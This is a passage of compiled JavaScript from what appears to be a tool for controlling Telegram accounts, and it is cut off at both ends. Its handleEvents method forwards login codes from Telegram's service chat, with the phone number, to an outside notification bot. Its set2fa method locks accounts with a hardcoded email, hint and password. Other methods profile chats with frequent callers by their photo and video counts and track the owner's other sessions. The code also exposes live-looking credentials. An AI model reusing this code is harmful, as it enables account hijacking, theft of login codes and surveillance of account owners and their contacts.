                                if (entity instanceof telegram_1.Api.User) {
                                    entityCache.set(chatId, {
                                        phone: entity.phone,
                                        username: entity.username,
                                        name: `${entity.firstName || ''} ${entity.lastName || ''}`.trim() || 'Unknown',
                                        peerType: 'user'
                                    });
                                }
                                else if (entity instanceof telegram_1.Api.Chat) {
                                    entityCache.set(chatId, {
                                        name: entity.title || 'Unknown Group',
                                        peerType: 'group'
                                    });
                                }
                                else if (entity instanceof telegram_1.Api.Channel) {
                                    entityCache.set(chatId, {
                                        username: entity.username,
                                        name: entity.title || 'Unknown Channel',
                                        peerType: 'channel'
                                    });
                                }
                                else {
                                    entityCache.set(chatId, {
                                        name: 'Unknown',
                                        peerType
                                    });
                                }
                            }
                            catch (entityError) {
                                this.logger.warn(this.phoneNumber, `Failed to get entity for chatId ${chatId}:`, entityError);
                                entityCache.set(chatId, {
                                    name: 'Unknown',
                                    peerType
                                });
                            }
                        }
                        const cachedEntity = entityCache.get(chatId);
                        filteredResults.chatCallCounts[chatId] = {
                            ...cachedEntity,
                            count: 0
                        };
                    }
                    filteredResults.chatCallCounts[chatId].count++;
                }
                catch (logError) {
                    this.logger.warn(this.phoneNumber, 'Error processing call log entry:', logError);
                }
            }
            const filteredChatCallCounts = [];
            for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
                if (details.count > 4) {
                    try {
                        let video = 0;
                        let photo = 0;
                        let totalMsgs = 0;
                        const maxMessagesToAnalyze = 600;
                        let messageCount = 0;
                        for await (const message of this.client.iterMessages(chatId, {
                            limit: maxMessagesToAnalyze,
                            reverse: false
                        })) {
                            messageCount++;
                            if (message.text) {
                                const text = message.text.toLowerCase();
                                if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                                    continue;
                                }
                            }
                            if (message.media && !(message.media instanceof telegram_1.Api.MessageMediaEmpty)) {
                                if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                                    photo++;
                                }
                                else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                                    const document = message.media.document;
                                    if (document instanceof telegram_1.Api.Document) {
                                        const isVideo = document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                                        const isImage = document.mimeType?.startsWith('image/');
                                        if (isVideo) {
                                            video++;
                                        }
                                        else if (isImage) {
                                            photo++;
                                        }
                                    }
                                }
                            }
                        }
                        totalMsgs = messageCount;
                        filteredChatCallCounts.push({
                            chatId,
                            ...details,
                            msgs: totalMsgs,
                            video,
                            photo
                        });
                    }
                    catch (msgError) {
                        this.logger.warn(this.phoneNumber, `Failed to get messages for chatId ${chatId}:`, msgError);
                        filteredChatCallCounts.push({
                            chatId,
                            ...details
                        });
                    }
                }
            }
            filteredChatCallCounts.sort((a, b) => b.count - a.count);
            this.logger.info(this.phoneNumber, 'CallLog completed:', {
                totalCalls: filteredResults.totalCalls,
                analyzedCalls,
                outgoing: filteredResults.outgoing,
                incoming: filteredResults.incoming,
                video: filteredResults.video,
                audio: filteredResults.audio,
                chatCount: filteredChatCallCounts.length
            });
            return {
                outgoing: filteredResults.outgoing,
                incoming: filteredResults.incoming,
                video: filteredResults.video,
                audio: filteredResults.audio,
                chatCallCounts: filteredChatCallCounts,
                totalCalls: filteredResults.totalCalls,
                analyzedCalls
            };
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error in getCallLog:', error);
            throw error;
        }
    }
    async getCallLogsInternal(maxCalls = 300) {
        const finalResult = {};
        const chunkSize = 100;
        let offsetId = 0;
        let totalFetched = 0;
        while (totalFetched < maxCalls) {
            const result = await this.client.invoke(new telegram_1.Api.messages.Search({
                peer: new telegram_1.Api.InputPeerEmpty(),
                q: '',
                filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId,
                addOffset: 0,
                limit: chunkSize,
                maxId: 0,
                minId: 0,
                hash: (0, big_integer_1.default)(0),
            }));
            const messages = result.messages || [];
            if (messages.length === 0)
                break;
            for (const log of messages) {
                if (!(log instanceof telegram_1.Api.Message) || !(log.action instanceof telegram_1.Api.MessageActionPhoneCall))
                    continue;
                if (!log.peerId || !(log.peerId instanceof telegram_1.Api.PeerUser))
                    continue;
                const chatId = log.peerId.userId.toString();
                if (!finalResult[chatId]) {
                    finalResult[chatId] = { outgoing: 0, incoming: 0, video: 0, totalCalls: 0 };
                }
                const stats = finalResult[chatId];
                stats.totalCalls++;
                if (log.out)
                    stats.outgoing++;
                else
                    stats.incoming++;
                if (log.action.video)
                    stats.video++;
            }
            totalFetched += messages.length;
            if (messages.length < chunkSize)
                break;
            const lastMsg = messages[messages.length - 1];
            offsetId = lastMsg.id ?? 0;
        }
        return finalResult;
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                this.logger.info(this.phoneNumber, event.message.text.toLowerCase());
                this.logger.info(this.phoneNumber, `Login Code received for - ${this.phoneNumber}\nActiveClientSetup - TelegramManager.activeClientSetup`);
                this.logger.info(this.phoneNumber, "Date :", new Date(event.message.date * 1000));
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
            }
        }
    }
    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll(),
                ],
            }));
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "LAstSeen Updated");
        }
        catch (e) {
            throw e;
        }
    }
    async updateProfile(firstName, about) {
        const data = {
            lastName: "",
        };
        if (firstName !== undefined) {
            data["firstName"] = firstName;
        }
        if (about !== undefined) {
            data["about"] = about;
        }
        try {
            const result = await this.client.invoke(new telegram_1.Api.account.UpdateProfile(data));
            this.logger.info(this.phoneNumber, "Updated NAme: ", firstName);
        }
        catch (error) {
            throw error;
        }
    }
    async downloadProfilePic(photoIndex) {
        try {
            const photos = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: 'me',
                offset: 0,
            }));
            if (photos.photos.length > 0) {
                this.logger.info(this.phoneNumber, `You have ${photos.photos.length} profile photos.`);
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = photos.photos[photoIndex];
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0);
                    const photoFileSize = selectedPhoto.sizes[index];
                    const photoBuffer = await this.client.downloadFile(new telegram_1.Api.InputPhotoFileLocation({
                        id: selectedPhoto.id,
                        accessHash: selectedPhoto.accessHash,
                        fileReference: selectedPhoto.fileReference,
                        thumbSize: photoFileSize.type
                    }), {
                        dcId: selectedPhoto.dcId,
                    });
                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        this.logger.info(this.phoneNumber, `Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    }
                    else {
                        this.logger.info(this.phoneNumber, "Failed to download the photo.");
                    }
                }
                else {
                    this.logger.info(this.phoneNumber, `Photo index ${photoIndex} is out of range.`);
                }
            }
            else {
                this.logger.info(this.phoneNumber, "No profile photos found.");
            }
        }
        catch (err) {
            this.logger.error(this.phoneNumber, "Error:", err);
        }
    }
    async getLastActiveTime() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
            let latest = 0;
            result.authorizations.forEach((auth) => {
                if (!this.isAuthMine(auth)) {
                    if (auth.dateActive && latest < auth.dateActive) {
                        latest = auth.dateActive;
                    }
                }
            });
            if (latest === 0) {
                return new Date().toISOString().split('T')[0];
            }
            return new Date(latest * 1000).toISOString().split('T')[0];
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting last active time:', error);
            return new Date().toISOString().split('T')[0];
        }
    }
    async getContacts() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const exportedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({
                hash: (0, big_integer_1.default)(0)
            }));
            return exportedContacts;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting contacts:', error);
            throw error;
        }
    }
    async deleteChat(params) {
        try {
            await this.client.invoke(new telegram_1.Api.messages.DeleteHistory(params));
            this.logger.info(this.phoneNumber, `Dialog with ID ${params.peer} has been deleted.`);
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Failed to delete dialog:', error);
        }
    }
    async blockUser(chatId) {
        try {
            await this.client?.invoke(new telegram_1.Api.contacts.Block({
                id: chatId,
            }));
            this.logger.info(this.phoneNumber, `User with ID ${chatId} has been blocked.`);
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Failed to block user:', error);
        }
    }
    async getMediaMetadata(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        let { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const hasAll = types.includes('all');
        const typesToFetch = hasAll
            ? ['photo', 'video', 'document', 'voice']
            : types.filter(t => t !== 'all');
        const queryLimit = hasAll ? (limit || 50) * typesToFetch.length : (limit || 50);
        const query = {
            limit: queryLimit,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && startDate instanceof Date && !isNaN(startDate.getTime()) && {
                minDate: Math.floor(startDate.getTime() / 1000)
            }),
            ...(endDate && endDate instanceof Date && !isNaN(endDate.getTime()) && {
                maxDate: Math.floor(endDate.getTime() / 1000)
            })
        };
        const ent = await this.safeGetEntity(chatId);
        this.logger.info(this.phoneNumber, "getMediaMetadata", params);
        const messages = await this.client.getMessages(ent, query);
        this.logger.info(this.phoneNumber, `Fetched ${messages.length} messages`);
        const filteredMessages = messages
            .filter(message => {
            if (!message.media)
                return false;
            const mediaType = this.getMediaType(message.media);
            return typesToFetch.includes(mediaType);
        })
            .map(message => {
            const mediaType = this.getMediaType(message.media);
            let fileSize;
            let mimeType;
            let filename;
            let width;
            let height;
            let duration;
            if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                const photo = message.photo;
                mimeType = 'image/jpeg';
                filename = 'photo.jpg';
                if (photo?.sizes && photo.sizes.length > 0) {
                    const largestSize = photo.sizes[photo.sizes.length - 1];
                    if (largestSize && 'size' in largestSize) {
                        fileSize = largestSize.size;
                    }
                    if (largestSize && 'w' in largestSize) {
                        width = largestSize.w;
                    }
                    if (largestSize && 'h' in largestSize) {
                        height = largestSize.h;
                    }
                }
            }
            else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                const doc = message.media.document;
                if (doc instanceof telegram_1.Api.Document) {
                    fileSize = typeof doc.size === 'number' ? doc.size : (doc.size ? Number(doc.size.toString()) : undefined);
                    mimeType = doc.mimeType;
                    const fileNameAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
                    filename = fileNameAttr?.fileName;
                    const videoAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                    if (videoAttr) {
                        width = videoAttr.w;
                        height = videoAttr.h;
                        duration = videoAttr.duration;
                    }
                    const audioAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeAudio);
                    if (audioAttr && !duration) {
                        duration = audioAttr.duration;
                    }
                }
            }
            let dateValue;
            const msgDate = message.date;
            if (msgDate) {
                if (typeof msgDate === 'number') {
                    dateValue = msgDate;
                }
                else if (typeof msgDate === 'object' && msgDate !== null && 'getTime' in msgDate) {
                    const dateObj = msgDate;
                    dateValue = Math.floor(dateObj.getTime() / 1000);
                }
                else {
                    dateValue = Math.floor(Date.now() / 1000);
                }
            }
            else {
                dateValue = Math.floor(Date.now() / 1000);
            }
            return {
                messageId: message.id,
                chatId: chatId,
                type: mediaType,
                date: dateValue,
                caption: message.message || '',
                fileSize,
                mimeType,
                filename,
                width,
                height,
                duration,
                mediaDetails: undefined
            };
        });
        if (hasAll) {
            const grouped = filteredMessages.reduce((acc, item) => {
                if (!acc[item.type]) {
                    acc[item.type] = [];
                }
                acc[item.type].push(item);
                return acc;
            }, {});
            const groups = typesToFetch.map(mediaType => {
                const items = (grouped[mediaType] || []).slice(0, limit);
                const typeTotal = items.length;
                const typeHasMore = grouped[mediaType]?.length > limit;
                const typeFirstMessageId = items.length > 0 ? items[0].messageId : undefined;
                const typeLastMessageId = items.length > 0 ? items[items.length - 1].messageId : undefined;
                const typeNextMaxId = typeHasMore ? typeLastMessageId : undefined;
                return {
                    type: mediaType,
                    count: typeTotal,
                    items: items,
                    pagination: {
                        page: 1,
                        limit,
                        total: typeTotal,
                        totalPages: typeHasMore ? -1 : 1,
                        hasMore: typeHasMore,
                        nextMaxId: typeNextMaxId,
                        firstMessageId: typeFirstMessageId,
                        lastMessageId: typeLastMessageId
                    }
                };
            });
            const totalItems = filteredMessages.length;
            const overallHasMore = messages.length === queryLimit && messages.length > 0;
            const overallFirstMessageId = filteredMessages.length > 0 ? filteredMessages[0].messageId : undefined;
            const overallLastMessageId = filteredMessages.length > 0 ? filteredMessages[filteredMessages.length - 1].messageId : undefined;
            const overallNextMaxId = overallHasMore ? overallLastMessageId : undefined;
            const overallPrevMaxId = maxId && filteredMessages.length > 0 ? overallFirstMessageId : undefined;
            return {
                groups,
                pagination: {
                    page: 1,
                    limit,
                    total: totalItems,
                    totalPages: overallHasMore ? -1 : 1,
                    hasMore: overallHasMore,
                    nextMaxId: overallNextMaxId,
                    prevMaxId: overallPrevMaxId,
                    firstMessageId: overallFirstMessageId,
                    lastMessageId: overallLastMessageId
                },
                filters: {
                    chatId,
                    types: ['all'],
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
        else {
            const total = filteredMessages.length;
            const hasMore = messages.length === queryLimit && messages.length > 0;
            const firstMessageId = filteredMessages.length > 0 ? filteredMessages[0].messageId : undefined;
            const lastMessageId = filteredMessages.length > 0 ? filteredMessages[filteredMessages.length - 1].messageId : undefined;
            const nextMaxId = hasMore ? lastMessageId : undefined;
            const prevMaxId = maxId && filteredMessages.length > 0 ? firstMessageId : undefined;
            return {
                data: filteredMessages,
                pagination: {
                    page: 1,
                    limit,
                    total,
                    totalPages: hasMore ? -1 : 1,
                    hasMore,
                    nextMaxId,
                    prevMaxId,
                    firstMessageId,
                    lastMessageId
                },
                filters: {
                    chatId,
                    types: typesToFetch,
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
    }
    async getThumbnail(messageId, chatId = 'me') {
        const message = await this.getMessageWithMedia(messageId, chatId);
        const thumbBuffer = await this.getThumbnailBuffer(message);
        if (!thumbBuffer) {
            throw new Error('Thumbnail not available for this media');
        }
        const etag = this.generateETag(messageId, chatId, `thumb-${messageId}`);
        return {
            buffer: thumbBuffer,
            etag,
            contentType: 'image/jpeg',
            filename: `thumbnail_${messageId}.jpg`
        };
    }
    async getMediaFileDownloadInfo(messageId, chatId = 'me') {
        const message = await this.getMessageWithMedia(messageId, chatId);
        const fileInfo = this.getMediaFileInfo(message);
        const fileId = typeof fileInfo.inputLocation.id === 'object'
            ? fileInfo.inputLocation.id.toString()
            : fileInfo.inputLocation.id;
        const etag = this.generateETag(messageId, chatId, fileId);
        return {
            ...fileInfo,
            etag
        };
    }
    async *streamMediaFile(fileLocation, offset = (0, big_integer_1.default)(0), limit = 5 * 1024 * 1024, requestSize = 512 * 1024) {
        for await (const chunk of this.client.iterDownload({
            file: fileLocation,
            offset,
            limit,
            requestSize,
        })) {
            yield chunk;
        }
    }
    async downloadWithTimeout(promise, timeout) {
        return Promise.race([
            promise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
        ]);
    }
    async processWithConcurrencyLimit(items, processor, concurrencyLimit = this.THUMBNAIL_CONCURRENCY_LIMIT, batchDelay = this.THUMBNAIL_BATCH_DELAY_MS) {
        const results = [];
        const errors = [];
        for (let i = 0; i < items.length; i += concurrencyLimit) {
            const batch = items.slice(i, i + concurrencyLimit);
            const batchResults = await Promise.allSettled(batch.map(item => processor(item)));
            for (const result of batchResults) {
                if (result.status === 'fulfilled') {
                    results.push(result.value);
                }
                else {
                    errors.push(result.reason);
                }
            }
            if (i + concurrencyLimit < items.length && batchDelay > 0) {
                await new Promise(resolve => setTimeout(resolve, batchDelay));
            }
        }
        if (errors.length > 0) {
            this.logger.warn(this.phoneNumber, `Completed processing with ${errors.length} errors out of ${items.length} items`);
        }
        return results;
    }
    getMediaDetails(media) {
        if (!media?.document)
            return null;
        const doc = media.document;
        if (doc instanceof telegram_1.Api.DocumentEmpty)
            return null;
        const videoAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
        const fileNameAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
        return {
            size: doc.size,
            mimeType: doc.mimeType,
            fileName: fileNameAttr?.fileName || null,
            duration: videoAttr?.duration || null,
            width: videoAttr?.w || null,
            height: videoAttr?.h || null
        };
    }
    async downloadFileFromUrl(url, maxSize = this.MAX_FILE_SIZE) {
        try {
            const headResponse = await axios_1.default.head(url, {
                timeout: this.FILE_DOWNLOAD_TIMEOUT,
                validateStatus: (status) => status >= 200 && status < 400
            });
            const contentLength = parseInt(headResponse.headers['content-length'] || '0', 10);
            if (contentLength > maxSize) {
                throw new Error(`File size ${contentLength} exceeds maximum ${maxSize} bytes`);
            }
            const response = await axios_1.default.get(url, {
                responseType: 'arraybuffer',
                timeout: this.FILE_DOWNLOAD_TIMEOUT,
                maxContentLength: maxSize,
                validateStatus: (status) => status >= 200 && status < 300
            });
            const buffer = Buffer.from(response.data);
            if (buffer.length > maxSize) {
                throw new Error(`Downloaded file size ${buffer.length} exceeds maximum ${maxSize} bytes`);
            }
            return buffer;
        }
        catch (error) {
            if (error.response) {
                throw new Error(`Failed to download file: HTTP ${error.response.status} - ${error.response.statusText}`);
            }
            else if (error.code === 'ECONNABORTED') {
                throw new Error(`Failed to download file: Request timeout after ${this.FILE_DOWNLOAD_TIMEOUT}ms`);
            }
            else {
                throw new Error(`Failed to download file: ${error.message}`);
            }
        }
    }
    detectContentType(filename, mimeType) {
        if (mimeType)
            return mimeType;
        const ext = filename.split('.').pop()?.toLowerCase() || '';
        const mimeMap = {
            'jpg': 'image/jpeg',
            'jpeg': 'image/jpeg',
            'png': 'image/png',
            'gif': 'image/gif',
            'webp': 'image/webp',
            'mp4': 'video/mp4',
            'webm': 'video/webm',
            'mov': 'video/quicktime',
            'avi': 'video/x-msvideo',
            'ogg': 'audio/ogg',
            'mp3': 'audio/mpeg',
            'wav': 'audio/wav',
            'pdf': 'application/pdf',
            'zip': 'application/zip',
            'doc': 'application/msword',
            'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        };
        return mimeMap[ext] || 'application/octet-stream';
    }
    generateETag(messageId, chatId, fileId) {
        const fileIdStr = typeof fileId === 'object' ? fileId.toString() : String(fileId);
        return `"${messageId}-${chatId}-${fileIdStr}"`;
    }
    async forwardMessage(toChatId, fromChatId, messageId) {
        try {
            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId });
        }
        catch (error) {
            this.logger.info(this.phoneNumber, "Failed to Forward Message : ", error.errorMessage);
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = '';
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                this.logger.info(this.phoneNumber, `Removed Username successfully.`);
            }
            catch (error) {
                this.logger.info(this.phoneNumber, error);
            }
        }
        else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(new telegram_1.Api.account.CheckUsername({ username }));
                    this.logger.info(this.phoneNumber, `Avialable: ${result} (${username})`);
                    if (result) {
                        await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                        this.logger.info(this.phoneNumber, `Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                    else {
                        if (increment >= 6) {
                            const randomNums = Math.floor(Math.random() * 90 + 10);
                            username = baseUsername + randomNums;
                        }
                        else {
                            username = baseUsername + increment;
                        }
                        increment++;
                        await (0, Helpers_1.sleep)(2000);
                    }
                }
                catch (error) {
                    this.logger.info(this.phoneNumber, error.message);
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    if (increment >= 6) {
                        const randomChars = Math.random().toString(36).substring(2, 6);
                        username = baseUsername + randomChars;
                    }
                    else {
                        username = baseUsername + increment;
                    }
                    increment++;
                    await (0, Helpers_1.sleep)(2000);
                }
            }
        }
        return newUserName;
    }
    async updatePrivacy() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyForwards(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "forwards Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll(),
                ],
            }));
            this.logger.info(this.phoneNumber, "LAstSeen Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
        }
        catch (e) {
            throw e;
        }
    }
    async sendViewOnceMedia(chatId, buffer, caption = '', isVideo, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;
            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile(actualFilename, buffer.length, actualFilename, buffer),
                workers: 1
            });
            const result = await this.client.invoke(new telegram_1.Api.messages.SendMedia({
                peer: chatId,
                media: isVideo
                    ? new telegram_1.Api.InputMediaUploadedDocument({
                        file: inputFile,
                        mimeType,
                        attributes: [
                            new telegram_1.Api.DocumentAttributeVideo({
                                supportsStreaming: true,
                                duration: 0,
                                w: 0,
                                h: 0
                            })
                        ],
                        ttlSeconds: 10
                    })
                    : new telegram_1.Api.InputMediaUploadedPhoto({
                        file: inputFile,
                        ttlSeconds: 10
                    }),
                message: caption,
                randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
            }));
            this.logger.info(this.phoneNumber, `Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
            return result;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending view-once media:', error);
            throw error;
        }
    }
    async getFileUrl(url, filename) {
        const uniqueFilename = `${filename}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
        const filePath = `/tmp/${uniqueFilename}`;
        try {
            const response = await axios_1.default.get(url, {
                responseType: 'stream',
                timeout: this.FILE_DOWNLOAD_TIMEOUT,
                maxContentLength: this.MAX_FILE_SIZE,
                validateStatus: (status) => status >= 200 && status < 300
            });
            await new Promise((resolve, reject) => {
                const writer = fs.createWriteStream(filePath);
                writer.on('finish', () => resolve());
                writer.on('error', reject);
                response.data.pipe(writer);
                response.data.on('error', reject);
            });
            setTimeout(() => {
                try {
                    if (fs.existsSync(filePath)) {
                        fs.unlinkSync(filePath);
                        this.logger.debug(this.phoneNumber, `Cleaned up temp file: ${filePath}`);
                    }
                }
                catch (cleanupError) {
                    this.logger.warn(this.phoneNumber, `Failed to cleanup temp file ${filePath}:`, cleanupError);
                }
            }, this.TEMP_FILE_CLEANUP_DELAY);
            return filePath;
        }
        catch (error) {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                }
            }
            catch (cleanupError) {
            }
            if (error.response) {
                throw new Error(`Failed to download file: HTTP ${error.response.status}`);
            }
            else if (error.code === 'ECONNABORTED') {
                throw new Error(`Failed to download file: Request timeout`);
            }
            else {
                throw new Error(`Failed to download file: ${error.message}`);
            }
        }
    }
    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                workers: 1,
            });
            this.logger.info(this.phoneNumber, "file uploaded");
            await this.client.invoke(new telegram_1.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            this.logger.info(this.phoneNumber, "profile pic updated");
        }
        catch (error) {
            throw error;
        }
    }
    async hasPassword() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const passwordInfo = await this.client.invoke(new telegram_1.Api.account.GetPassword());
            return passwordInfo.hasPassword || false;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error checking password status:', error);
            return false;
        }
    }
    async set2fa() {
        if (!(await this.hasPassword())) {
            this.logger.info(this.phoneNumber, "Password Does not exist, Setting 2FA");
            const imapService = IMap_1.MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };
            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    this.logger.info(this.phoneNumber, "Checking if mail is ready");
                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        this.logger.info(this.phoneNumber, "Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                this.logger.info(this.phoneNumber, "Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            this.logger.info(this.phoneNumber, "Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                this.logger.info(this.phoneNumber, 'Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            }
                                            else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        }
                                        catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                this.logger.error(this.phoneNumber, 'Email code error:', (0, parseError_1.parseError)(e));
                                return Promise.resolve("error");
                            }
                        });
                        return twoFaDetails;
                    }
                    else {
                        this.logger.info(this.phoneNumber, "Mail not ready yet");
                    }
                }, 5000);
            }
            catch (e) {
                this.logger.error(this.phoneNumber, "Unable to connect to mail server:", (0, parseError_1.parseError)(e));
            }
        }
        else {
            this.logger.info(this.phoneNumber, "Password already exists");
        }
    }
    async sendPhotoChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const buffer = await this.downloadFileFromUrl(url);
            const file = new uploads_1.CustomFile(filename, buffer.length, filename, buffer);
            await this.client.sendFile(id, { file, caption });
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending photo:', error);
            throw error;
        }
    }
    async sendFileChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const buffer = await this.downloadFileFromUrl(url);
            const file = new uploads_1.CustomFile(filename, buffer.length, filename, buffer);
            await this.client.sendFile(id, { file, caption });
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending file:', error);
            throw error;
        }
    }
    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            this.logger.info(this.phoneNumber, `Profile Pics found: ${result.photos.length}`);
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(new telegram_1.Api.photos.DeletePhotos({
